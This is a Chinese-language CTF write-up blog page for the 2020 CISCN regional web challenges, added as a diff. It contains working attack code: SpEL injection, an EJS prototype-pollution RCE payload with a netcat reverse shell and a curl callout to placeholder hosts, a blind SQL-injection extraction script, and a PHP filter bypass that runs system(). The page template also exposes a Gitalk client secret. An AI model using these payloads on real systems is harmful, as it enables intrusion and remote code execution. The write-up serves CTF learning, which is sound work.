@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    2020ciscn华东北分区赛web题目wp |
+    
+    Mount4in</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Mount4in" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-2020ciscn华东北分区赛web题目wp" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      2020ciscn华东北分区赛web题目wp
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/09/13/2020ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9Bweb%E9%A2%98%E7%9B%AEwp/" class="article-date">
+  <time datetime="2020-09-13T12:07:27.000Z" itemprop="datePublished">2020-09-13</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        
+        <p>前言：2333</p>
+<a id="more"></a>
+
+<h1 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h1><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>直接访问flag.php就可以了。</p>
+<p>感觉预期解应该为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;huadongbei&#x2F;cat.php?s1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,Zmlyc3QgYmxvb2Q&#x3D;&amp;s2&#x3D;0e215962017&amp;s3&#x3D;SHELL.TXT HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.43.44</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.102 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 13</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">file&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>spel表达式注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.class. forName(&quot;java.nio.file.File&quot;).lines(1.class. forName(&quot;java.nio.file.Paths&quot;).get(&quot;&#x2F;flag.txt&quot;)).toArray()[0]</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/13/2020ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9Bweb%E9%A2%98%E7%9B%AEwp/image-20200912171629921.png" alt="image-20200912171629921"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://172.20.7.104:8080"</span></span><br><span class="line">payload = <span class="string">"1.class.forName(\"java.nio.file.Files\").lines\x00(1.class.forName(\"java.nio.file.Paths\").get\x00(\"/flag.txt\")).toArray()[0]"</span></span><br><span class="line">proxy = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line">data = &#123;<span class="string">"expr"</span>:payload&#125; </span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">&#125;</span><br><span class="line">re = requests.post(url, data, headers=headers, proxies=proxy)</span><br><span class="line">print(re.content)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/13/2020ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9Bweb%E9%A2%98%E7%9B%AEwp/image-20200912171031671.png" alt="image-20200912171031671"></p>
+<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>参考：</p>
+<p><a href="http://blackwolfsec.cc/2018/05/23/Nginx_alias_misconfig_path_traversle/" target="_blank" rel="noopener">Nginx错误配置alias导致目录遍历漏洞</a></p>
+<p><img src="/2020/09/13/2020ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9Bweb%E9%A2%98%E7%9B%AEwp/image-20200912203459538.png" alt="image-20200912203459538"></p>
+<p>nginx配置出错，可以读文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;default.conf</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name _;</span><br><span class="line">    location &#x2F;static &#123;</span><br><span class="line">        autoindex on;</span><br><span class="line">        alias &#x2F;app&#x2F;static&#x2F;;</span><br><span class="line">    &#125;</span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">	    proxy_pass http:&#x2F;&#x2F;127.0.0.1:3000;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>express-upload  原型链污染 –&gt;  ejs模板rce。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;4_pATh_y0u_CaNN07_Gu3ss HTTP&#x2F;1.1</span><br><span class="line">Host: 172.20.7.107</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.102 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundarykhBq9JNmc6ZBCe9M</span><br><span class="line">Content-Length: 261</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarykhBq9JNmc6ZBCe9M</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;__proto__.outputFunctionName&quot;;</span><br><span class="line"></span><br><span class="line">_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&quot;cat &#x2F;flag.txt &gt; aa&quot;);var __tmp</span><br><span class="line">------WebKitFormBoundarykhBq9JNmc6ZBCe9M--</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/13/2020ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9Bweb%E9%A2%98%E7%9B%AEwp/image-20200912135951627.png" alt="image-20200912135951627"></p>
+<p><img src="/2020/09/13/2020ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9Bweb%E9%A2%98%E7%9B%AEwp/image-20200912171056211.png" alt="image-20200912171056211"></p>
+<p><img src="/2020/09/13/2020ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9Bweb%E9%A2%98%E7%9B%AEwp/image-20200912140046413.png" alt="image-20200912140046413"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://172.20.7.107/4_pATh_y0u_CaNN07_Gu3ss"</span></span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">"__proto__.outputFunctionName"</span> : (<span class="literal">None</span>,<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec(\"curl xxxx:6666\");var __tmp"</span>)</span><br><span class="line">&#125;</span><br><span class="line">payload = <span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('rm /tmp/fa;mkfifo /tmp/fa;cat /tmp/fa|/bin/sh -i 2&gt;&amp;1|nc xxx 6666 &gt; /tmp/fa ');var __tmp2"</span></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">"__proto__.outputFunctionName"</span> : (<span class="literal">None</span>,payload)</span><br><span class="line">&#125;</span><br><span class="line">proxies = &#123;<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,<span class="string">"https"</span>: <span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line">re = requests.post(url, files = files, proxies=proxies)</span><br><span class="line"><span class="keyword">print</span> re.text</span><br></pre></td></tr></table></figure>
+
+<h1 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h1><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://172.20.7.102/index.php"</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">		<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">		&#125;</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#erfenfa</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">13</span>):</span><br><span class="line">	high = <span class="number">127</span></span><br><span class="line">	low = <span class="number">32</span></span><br><span class="line">	mid = (low + high) // <span class="number">2</span>	</span><br><span class="line">	<span class="keyword">while</span> high &gt; low:</span><br><span class="line">		payload = <span class="string">"||ascii(right(password,&#123;&#125;))/**/&gt;/**/&#123;&#125;#"</span></span><br><span class="line">		payload = payload.format((<span class="number">13</span>-i),mid)</span><br><span class="line">		data = &#123;</span><br><span class="line">			<span class="string">"username"</span>:<span class="string">"admin\\"</span>,</span><br><span class="line">			<span class="string">"password"</span>:payload</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">print</span> payload</span><br><span class="line">		r = requests.post(url,data=data,proxies=proxies)</span><br><span class="line">		<span class="comment">#print(r.content)</span></span><br><span class="line">		<span class="keyword">if</span> <span class="string">"error"</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			low=mid+<span class="number">1</span> </span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			high=mid</span><br><span class="line">		mid=(low+high)//<span class="number">2</span></span><br><span class="line">	flag+=chr(mid)</span><br><span class="line">	print(flag)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/13/2020ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9Bweb%E9%A2%98%E7%9B%AEwp/image-20200913125614666.png" alt="image-20200913125614666"></p>
+<p>登陆</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'gzmtu'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $gzmtu = $_GET[<span class="string">'gzmtu'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/(f|l|a|g|\.|t|x|\/|;|\"|\'|\`|\||\[|\]|\_|\^|=)/i'</span>,$gzmtu)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'forbidden'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = get_defined_functions()[<span class="string">'internal'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blackitem . <span class="string">'/im'</span>, $gzmtu)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'nonono!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$gzmtu.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>取反绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.20.7.102&#x2F;c2ZtdHFs.php?gzmtu&#x3D;(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98%D1%8B%87%8B)</span><br><span class="line">system(&quot;cat &#x2F;flag.txt&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/13/2020ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9Bweb%E9%A2%98%E7%9B%AEwp/image-20200913121916000.png" alt="image-20200913121916000"></p>
+<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>PostgreSQL注入，没做出来。。。。。。</p>
+<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>修复是才知道是ssrf，</p>
+<p>有一个ssrf.php，据说file:///flag 就可以得到flag</p>
+
+      
+    </div>
+  </div>
+  <!-- 要添加的内容 -->
+  
+    <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>作者:  </strong>Mount4in</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>文章链接:  </strong>
+          <a href="/2020/09/13/2020ciscn华东北分区赛web题目wp/" target="_blank" title="2020ciscn华东北分区赛web题目wp">http://mount4in.github.io/2020/09/13/2020ciscn华东北分区赛web题目wp/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>版权声明:   </strong>
+            本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            许可协议。转载请注明出处!
+          </li>
+        </ul>
+      <div>
+
+  
+  <!---->
+    <footer class="article-footer">
+      <a data-url="http://mount4in.github.io/2020/09/13/2020ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9Bweb%E9%A2%98%E7%9B%AEwp/" data-id="clg20p5ko000414uvduqk9w0q"
+         class="article-share-link">Share</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+
+    </footer>
+
+
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2020/09/18/%E8%8B%A5%E4%BE%9D%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fshiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            若依后台管理系统shiro反序列化漏洞
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">Wordpress File-manager 任意文件上传漏洞分析</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: 'b7d32ae2538e1a71f462',
+      clientSecret: 'da0452b610458a4ccbc38598fb0d02f0eb9e653d',
+      repo: 'gitalk',
+      owner: 'Mount4in',
+      admin: ['Mount4in'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2023 Mount4in</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="Mount4in"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
